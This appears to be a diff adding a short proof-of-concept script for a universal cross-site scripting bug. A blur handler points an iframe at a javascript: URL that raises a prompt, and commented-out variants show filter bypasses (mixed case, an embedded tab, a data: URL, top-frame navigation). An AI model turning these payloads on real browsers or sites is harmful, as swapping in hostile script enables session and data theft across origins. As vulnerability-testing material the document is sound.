@@ -1,0 +1,10 @@
+<script>
+window.onblur = function () {
+  var f = document.getElementById("iframe");
+  // Uji tiap varian satu per satu:
+  f.src = "JavaScript:prompt('UXSS PoC: executed in host context','')";        // case
+  // f.src = "java\tscript:prompt('UXSS PoC','')";                              // whitespace
+  // f.src = "data:text/html,<script>prompt('UXSS PoC','')<\/script>";          // data:
+  // location = "javascript:prompt('UXSS PoC','')";                            // top-frame
+};
+</script>
